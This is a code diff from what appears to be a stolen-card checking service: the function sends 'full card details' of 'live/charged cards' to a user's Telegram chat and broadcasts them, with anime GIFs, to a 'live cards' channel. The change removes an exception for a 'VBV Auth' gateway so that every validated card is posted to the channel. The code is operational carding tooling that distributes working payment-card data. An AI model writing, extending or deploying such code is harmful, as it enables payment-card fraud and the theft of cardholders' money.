@@ -487,18 +487,13 @@ ${toFancyScript('Yunchi')} ⚡`.trim();
     // Send notification to user with full card details and random anime GIF
     const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
     
-    // Skip channel broadcast for Yunchi VBV Auth gateway
-    let sentToChannel = false;
-    if (gateway.toLowerCase().includes('vbv')) {
-      console.log("[NOTIFY-CHARGED] Skipping channel broadcast for VBV Auth gateway");
-    } else {
-      // Get a second random GIF for channel broadcast
-      const channelGif = await getRandomAnimeGif();
-      
-      // Broadcast to live cards channel with full details and GIF
-      console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID);
-      sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, channelMessage);
-    }
+    // Broadcast ALL live/charged cards to channel (no exclusions)
+    // Get a second random GIF for channel broadcast
+    const channelGif = await getRandomAnimeGif();
+    
+    // Broadcast to live cards channel with full details and GIF
+    console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID, "Gateway:", gateway);
+    const sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, channelMessage);
 
     return new Response(
       JSON.stringify({ 
